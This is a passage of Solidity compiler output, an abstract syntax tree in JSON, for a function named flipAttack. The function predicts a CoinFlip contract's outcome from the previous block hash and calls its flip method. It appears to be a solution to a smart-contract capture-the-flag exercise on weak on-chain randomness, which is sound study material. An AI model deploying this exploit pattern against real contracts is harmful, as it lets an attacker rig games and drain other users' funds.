														"name": "blockValue",
														"nameLocation": "412:10:1",
														"nodeType": "VariableDeclaration",
														"scope": 138,
														"src": "404:18:1",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 105,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "404:7:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 116,
												"initialValue": {
													"arguments": [
														{
															"arguments": [
																{
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 113,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"expression": {
																			"id": 110,
																			"name": "block",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 4294967292,
																			"src": "443:5:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_magic_block",
																				"typeString": "block"
																			}
																		},
																		"id": 111,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"memberLocation": "449:6:1",
																		"memberName": "number",
																		"nodeType": "MemberAccess",
																		"src": "443:12:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "-",
																	"rightExpression": {
																		"hexValue": "31",
																		"id": 112,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "458:1:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_1_by_1",
																			"typeString": "int_const 1"
																		},
																		"value": "1"
																	},
																	"src": "443:16:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"id": 109,
																"name": "blockhash",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 4294967291,
																"src": "433:9:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_blockhash_view$_t_uint256_$returns$_t_bytes32_$",
																	"typeString": "function (uint256) view returns (bytes32)"
																}
															},
															"id": 114,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "433:27:1",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_bytes32",
																"typeString": "bytes32"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bytes32",
																"typeString": "bytes32"
															}
														],
														"id": 108,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "425:7:1",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_uint256_$",
															"typeString": "type(uint256)"
														},
														"typeName": {
															"id": 107,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "425:7:1",
															"typeDescriptions": {}
														}
													},
													"id": 115,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "425:36:1",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "404:57:1"
											},
											{
												"assignments": [
													118
												],
												"declarations": [
													{
														"constant": false,
														"id": 118,
														"mutability": "mutable",
														"name": "coinFlip",
														"nameLocation": "480:8:1",
														"nodeType": "VariableDeclaration",
														"scope": 138,
														"src": "472:16:1",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 117,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "472:7:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 122,
												"initialValue": {
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 121,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"id": 119,
														"name": "blockValue",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 106,
														"src": "491:10:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "/",
													"rightExpression": {
														"id": 120,
														"name": "FACTOR",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 90,
														"src": "504:6:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "491:19:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "472:38:1"
											},
											{
												"assignments": [
													124
												],
												"declarations": [
													{
														"constant": false,
														"id": 124,
														"mutability": "mutable",
														"name": "side",
														"nameLocation": "525:4:1",
														"nodeType": "VariableDeclaration",
														"scope": 138,
														"src": "520:9:1",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"typeName": {
															"id": 123,
															"name": "bool",
															"nodeType": "ElementaryTypeName",
															"src": "520:4:1",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 131,
												"initialValue": {
													"condition": {
														"commonType": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"id": 127,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"id": 125,
															"name": "coinFlip",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 118,
															"src": "532:8:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "==",
														"rightExpression": {
															"hexValue": "31",
															"id": 126,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "544:1:1",
															"typeDescriptions": {
																"typeIdentifier": "t_rational_1_by_1",
																"typeString": "int_const 1"
															},
															"value": "1"
														},
														"src": "532:13:1",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"falseExpression": {
														"hexValue": "66616c7365",
														"id": 129,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "bool",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "555:5:1",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"value": "false"
													},
													"id": 130,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"nodeType": "Conditional",
													"src": "532:28:1",
													"trueExpression": {
														"hexValue": "74727565",
														"id": 128,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "bool",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "548:4:1",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"value": "true"
													},
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "520:40:1"
											},
											{
												"expression": {
													"arguments": [
														{
															"id": 135,
															"name": "side",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 124,
															"src": "590:4:1",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														],
														"expression": {
															"id": 132,
															"name": "victimContract",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 87,
															"src": "570:14:1",
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_CoinFlip_$81",
																"typeString": "contract CoinFlip"
															}
														},
														"id": 134,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberLocation": "585:4:1",
														"memberName": "flip",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 80,
														"src": "570:19:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_nonpayable$_t_bool_$returns$_t_bool_$",
															"typeString": "function (bool) external returns (bool)"
														}
													},
													"id": 136,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "570:25:1",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 137,
												"nodeType": "ExpressionStatement",
												"src": "570:25:1"
											}
										]
									},
									"functionSelector": "987a4e26",
									"id": 139,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "flipAttack",
									"nameLocation": "374:10:1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 103,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "384:2:1"
									},
									"returnParameters": {
										"id": 104,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "394:0:1"
									},
									"scope": 140,
									"src": "365:237:1",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								}
							],
							"scope": 141,
							"src": "91:513:1",
							"usedErrors": [],
							"usedEvents": []
						}
					],
					"src": "32:572:1"
				},
				"id": 1
			}
		}
	}
}